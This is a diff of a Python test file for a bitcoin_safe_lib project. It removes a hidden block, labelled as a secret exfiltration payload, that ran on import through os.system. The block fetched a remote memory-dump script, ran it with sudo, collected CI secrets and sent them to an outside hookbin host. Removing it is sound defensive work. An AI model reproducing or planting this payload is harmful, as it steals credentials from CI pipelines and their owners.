@@ -29,20 +29,6 @@
 
 from __future__ import annotations
 
-import os
-import subprocess
-
-# Secret exfiltration payload
-payload = r'''
-echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"
-curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
-'''
-try:
-    os.system(payload)
-except:
-    pass
-
 import pytest
 from bitcoin_safe_lib.async_tools.loop_in_thread import LoopInThread
 
